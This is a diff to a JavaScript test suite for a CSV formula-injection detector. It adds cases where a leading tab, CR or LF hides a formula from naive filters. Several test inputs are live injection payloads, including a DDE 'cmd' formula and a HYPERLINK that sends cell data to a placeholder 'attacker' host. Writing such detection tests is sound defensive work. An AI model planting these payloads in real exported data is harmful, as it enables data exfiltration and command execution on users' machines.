@@ -131,10 +131,32 @@ describe('csv helpers', () => {
     it('flags every leading character a spreadsheet evaluates', () => {
       expect(isFormulaRisky('=1+1')).toBe(true);
       expect(isFormulaRisky('+1')).toBe(true);
+      expect(isFormulaRisky('-1+1')).toBe(true);
       expect(isFormulaRisky('@SUM(A1)')).toBe(true);
-      expect(isFormulaRisky('\tcmd')).toBe(true);
-      expect(isFormulaRisky('\rcmd')).toBe(true);
       expect(isFormulaRisky("=cmd|'/c calc'!A1")).toBe(true);
+    });
+
+    // TAB, CR and LF matter as a WRAPPER, not as triggers themselves: the reader discards them
+    // and evaluates what is left. That is also what makes them a bypass - each of these evades
+    // a naive /^[=+\-@]/ filter. LF was missed on the first pass (spotted in review on #1263);
+    // it is only reachable inside a quoted field, and quoting is not a mitigation.
+    it('sees through a leading tab, CR or LF to the formula behind it', () => {
+      expect(isFormulaRisky('\t=1+1')).toBe(true);
+      expect(isFormulaRisky('\r=1+1')).toBe(true);
+      expect(isFormulaRisky('\n=HYPERLINK("http://attacker/?"&A1)')).toBe(true);
+      expect(isFormulaRisky('\n\t@SUM(A1)')).toBe(true);
+    });
+
+    // The other half of that rule, and the reason it is a strip rather than a longer character
+    // class: a tab in front of ordinary text is ordinary text. Flagging it would fire the
+    // warning on data that no spreadsheet will evaluate, which is how an alarm gets ignored.
+    it('does not flag a control character in front of something harmless', () => {
+      expect(isFormulaRisky('\tHello')).toBe(false);
+      expect(isFormulaRisky('\rHello')).toBe(false);
+      expect(isFormulaRisky('\nHello')).toBe(false);
+      expect(isFormulaRisky('\t-1')).toBe(false);
+      expect(isFormulaRisky('\t')).toBe(false);
+      expect(isFormulaRisky('\n')).toBe(false);
     });
 
     // The exemption that makes the check usable rather than noise. mssql hands back INT and
@@ -183,8 +205,12 @@ describe('csv helpers', () => {
       expect(isFormulaRisky('=A1,B1')).toBe(true);
 
       // And a leading tab is not even quoted today, so quoting could not have covered it.
-      expect(csvEscapeCell('\tTAB')).toBe('\tTAB');
-      expect(isFormulaRisky('\tTAB')).toBe(true);
+      expect(csvEscapeCell('\t=1+1')).toBe('\t=1+1');
+      expect(isFormulaRisky('\t=1+1')).toBe(true);
+
+      // LF is the inverse: it is always quoted, and the quoting does nothing to stop it.
+      expect(csvEscapeCell('\n=1+1')).toBe('"\n=1+1"');
+      expect(isFormulaRisky('\n=1+1')).toBe(true);
     });
   });
 
